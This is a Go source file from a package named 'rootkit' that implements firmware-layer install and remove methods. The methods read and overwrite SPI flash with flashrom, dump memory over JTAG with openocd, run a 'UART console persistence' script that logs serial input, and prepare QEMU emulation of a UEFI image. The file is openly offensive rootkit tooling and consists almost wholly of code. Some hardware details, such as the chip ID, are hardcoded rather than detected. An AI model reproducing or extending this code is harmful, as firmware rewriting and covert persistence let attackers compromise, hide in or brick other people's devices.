package rootkit

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type FirmwareBaseMethod struct {
	name string
}

func (b *FirmwareBaseMethod) Name() string {
	return b.name
}

func (b *FirmwareBaseMethod) Layer() RootkitLayer {
	return LayerFirmware
}

type SPIFlashReadMethod struct {
	FirmwareBaseMethod
}

func NewSPIFlashReadMethod() *SPIFlashReadMethod {
	return &SPIFlashReadMethod{FirmwareBaseMethod: FirmwareBaseMethod{name: "spi_flash_read"}}
}

func (m *SPIFlashReadMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	spiPath := "/dev/spidev0.0"
	if _, err := os.Stat(spiPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("SPI device not found: %s", spiPath)
	}

	flashInfo := &SPIFlashInfo{
		ChipID:    "W25Q128",
		VendorID:  "EF40",
		Capacity:  16 * 1024 * 1024,
		BlockSize: 4096,
		Writeable: true,
	}

	cmd := exec.Command("flashrom", "-p", "linux_spi:dev=/dev/spidev0.0", "-r", "/tmp/firmware_dump.bin")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to read SPI flash: %w: %s", err, string(output))
	}

	backupPath := filepath.Join(config.BackupPath, "firmware_dump.bin")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd = exec.Command("cp", "-f", "/tmp/firmware_dump.bin", backupPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to copy firmware dump: %w: %s", err, string(output))
	}

	hashCmd := exec.Command("sha256sum", backupPath)
	hashOutput, _ := hashCmd.CombinedOutput()
	hash := strings.Fields(string(hashOutput))[0]

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSPIFlashRead,
		Layer:     LayerFirmware,
		Details: map[string]string{
			"spi_path":   spiPath,
			"chip_id":    flashInfo.ChipID,
			"vendor_id":  flashInfo.VendorID,
			"capacity":   fmt.Sprintf("%d", flashInfo.Capacity),
			"backup_path": backupPath,
			"hash":       hash,
		},
	}, nil
}

func (m *SPIFlashReadMethod) Remove(config *RootkitConfig) error {
	return os.Remove(filepath.Join(config.BackupPath, "firmware_dump.bin"))
}

func (m *SPIFlashReadMethod) Verify(config *RootkitConfig) (bool, error) {
	backupPath := filepath.Join(config.BackupPath, "firmware_dump.bin")
	_, err := os.Stat(backupPath)
	return err == nil, nil
}

type SPIFlashWriteMethod struct {
	FirmwareBaseMethod
}

func NewSPIFlashWriteMethod() *SPIFlashWriteMethod {
	return &SPIFlashWriteMethod{FirmwareBaseMethod: FirmwareBaseMethod{name: "spi_flash_write"}}
}

func (m *SPIFlashWriteMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	spiPath := "/dev/spidev0.0"
	if _, err := os.Stat(spiPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("SPI device not found: %s", spiPath)
	}

	backupPath := filepath.Join(config.BackupPath, "original_firmware.bin")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd := exec.Command("flashrom", "-p", "linux_spi:dev=/dev/spidev0.0", "-r", backupPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to backup firmware: %w: %s", err, string(output))
	}

	cmd = exec.Command("flashrom", "-p", "linux_spi:dev=/dev/spidev0.0", "-w", config.FirmwarePath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to write firmware: %w: %s", err, string(output))
	}

	verifyCmd := exec.Command("flashrom", "-p", "linux_spi:dev=/dev/spidev0.0", "-v", config.FirmwarePath)
	if output, err := verifyCmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("firmware verification failed: %w: %s", err, string(output))
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSPIFlashWrite,
		Layer:     LayerFirmware,
		Details: map[string]string{
			"spi_path":     spiPath,
			"firmware_path": config.FirmwarePath,
			"backup_path":   backupPath,
		},
	}, nil
}

func (m *SPIFlashWriteMethod) Remove(config *RootkitConfig) error {
	spiPath := "/dev/spidev0.0"
	backupPath := filepath.Join(config.BackupPath, "original_firmware.bin")

	cmd := exec.Command("flashrom", "-p", "linux_spi:dev="+spiPath, "-w", backupPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *SPIFlashWriteMethod) Verify(config *RootkitConfig) (bool, error) {
	spiPath := "/dev/spidev0.0"
	cmd := exec.Command("flashrom", "-p", "linux_spi:dev="+spiPath, "-V")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "found"), nil
}

type JTAGDebugMethod struct {
	FirmwareBaseMethod
}

func NewJTAGDebugMethod() *JTAGDebugMethod {
	return &JTAGDebugMethod{FirmwareBaseMethod: FirmwareBaseMethod{name: "jtag_debug"}}
}

func (m *JTAGDebugMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	jtagPath := "/dev/jtag0"
	if _, err := os.Stat(jtagPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("JTAG device not found: %s", jtagPath)
	}

	jtagInfo := &JTAGInfo{
		Interface: "JTAG",
		ChainLen:  1,
		Devices:   []string{"ARM Cortex-A53"},
		Speed:     10000,
	}

	cmd := exec.Command("openocd", "-f", "interface/jlink.cfg",
		"-c", "adapter speed 10000",
		"-c", "transport select jtag",
		"-c", "jtag newtap auto cpu -irlen 4")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to initialize JTAG: %w: %s", err, string(output))
	}

	dumpPath := filepath.Join(config.BackupPath, "jtag_dump.bin")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd = exec.Command("openocd", "-f", "interface/jlink.cfg",
		"-c", "adapter speed 10000",
		"-c", "init",
		"-c", "dump_image "+dumpPath+" 0x0 0x100000")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to dump via JTAG: %w: %s", err, string(output))
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueJTAGDebug,
		Layer:     LayerFirmware,
		Details: map[string]string{
			"jtag_path":  jtagPath,
			"interface":  jtagInfo.Interface,
			"chain_len":  fmt.Sprintf("%d", jtagInfo.ChainLen),
			"speed":      fmt.Sprintf("%d", jtagInfo.Speed),
			"dump_path":  dumpPath,
		},
	}, nil
}

func (m *JTAGDebugMethod) Remove(config *RootkitConfig) error {
	dumpPath := filepath.Join(config.BackupPath, "jtag_dump.bin")
	return os.Remove(dumpPath)
}

func (m *JTAGDebugMethod) Verify(config *RootkitConfig) (bool, error) {
	dumpPath := filepath.Join(config.BackupPath, "jtag_dump.bin")
	_, err := os.Stat(dumpPath)
	return err == nil, nil
}

type UARTConsoleMethod struct {
	FirmwareBaseMethod
}

func NewUARTConsoleMethod() *UARTConsoleMethod {
	return &UARTConsoleMethod{FirmwareBaseMethod: FirmwareBaseMethod{name: "uart_console"}}
}

func (m *UARTConsoleMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	uartPath := "/dev/ttyS0"
	if _, err := os.Stat(uartPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("UART device not found: %s", uartPath)
	}

	cmd := exec.Command("stty", "-F", uartPath, "115200", "raw", "-echo", "-echoe", "-echok")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to configure UART: %w: %s", err, string(output))
	}

	consoleScript := fmt.Sprintf(`#!/bin/sh
# UART console persistence
while true; do
    cat %s > /tmp/uart_input.log &
    echo "rootkit_console" > %s
    sleep 3600
done
`, uartPath, uartPath)

	scriptPath := filepath.Join(config.BackupPath, "uart_console.sh")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}
	if err := os.WriteFile(scriptPath, []byte(consoleScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write UART console script: %w", err)
	}

	cmd = exec.Command("sh", scriptPath)
	cmd.CombinedOutput()

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueUARTConsole,
		Layer:     LayerFirmware,
		Details: map[string]string{
			"uart_path":   uartPath,
			"script_path": scriptPath,
			"baud_rate":   "115200",
		},
	}, nil
}

func (m *UARTConsoleMethod) Remove(config *RootkitConfig) error {
	scriptPath := filepath.Join(config.BackupPath, "uart_console.sh")
	return os.Remove(scriptPath)
}

func (m *UARTConsoleMethod) Verify(config *RootkitConfig) (bool, error) {
	scriptPath := filepath.Join(config.BackupPath, "uart_console.sh")
	_, err := os.Stat(scriptPath)
	return err == nil, nil
}

type FirmwareEmulationMethod struct {
	FirmwareBaseMethod
}

func NewFirmwareEmulationMethod() *FirmwareEmulationMethod {
	return &FirmwareEmulationMethod{FirmwareBaseMethod: FirmwareBaseMethod{name: "firmware_emulation"}}
}

func (m *FirmwareEmulationMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	emulationDir := filepath.Join(config.BackupPath, "emulation")
	if err := os.MkdirAll(emulationDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create emulation directory: %w", err)
	}

	qemuScript := fmt.Sprintf(`#!/bin/sh
qemu-system-x86_64 \
    -drive if=pflash,format=raw,readonly=on,file=%s \
    -m 2G \
    -smp 2 \
    -nographic \
    -net none \
    -monitor unix:/tmp/qemu-monitor.sock,server,nowait \
    -serial unix:/tmp/qemu-serial.sock,server,nowait \
    -bios %s
`, config.FirmwarePath, config.FirmwarePath)

	qemuPath := filepath.Join(emulationDir, "run_qemu.sh")
	if err := os.WriteFile(qemuPath, []byte(qemuScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write QEMU script: %w", err)
	}

	uefiVars := filepath.Join(emulationDir, "OVMF_VARS.fd")
	cmd := exec.Command("cp", "/usr/share/OVMF/OVMF_VARS.fd", uefiVars)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to copy UEFI vars: %w: %s", err, string(output))
	}

	configPath := filepath.Join(emulationDir, "emulation.conf")
	emulationConfig := &FirmwareEmulationConfig{
		UEFIFirmwarePath: config.FirmwarePath,
		NVRAMPath:        uefiVars,
		MemorySize:       2 * 1024 * 1024 * 1024,
		CPUCores:         2,
		EnableDebug:      true,
	}

	configContent := fmt.Sprintf(`UEFI_FIRMWARE=%s
NVRAM=%s
MEMORY=%d
CPUS=%d
DEBUG=%v
`, emulationConfig.UEFIFirmwarePath, emulationConfig.NVRAMPath, emulationConfig.MemorySize, emulationConfig.CPUCores, emulationConfig.EnableDebug)

	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write emulation config: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueFirmwareEmulation,
		Layer:     LayerFirmware,
		Details: map[string]string{
			"emulation_dir": emulationDir,
			"qemu_script":   qemuPath,
			"uefi_vars":     uefiVars,
			"config_path":   configPath,
		},
	}, nil
}

func (m *FirmwareEmulationMethod) Remove(config *RootkitConfig) error {
	emulationDir := filepath.Join(config.BackupPath, "emulation")
	return os.RemoveAll(emulationDir)
}

func (m *FirmwareEmulationMethod) Verify(config *RootkitConfig) (bool, error) {
	emulationDir := filepath.Join(config.BackupPath, "emulation")
	_, err := os.Stat(emulationDir)
	return err == nil, nil
}
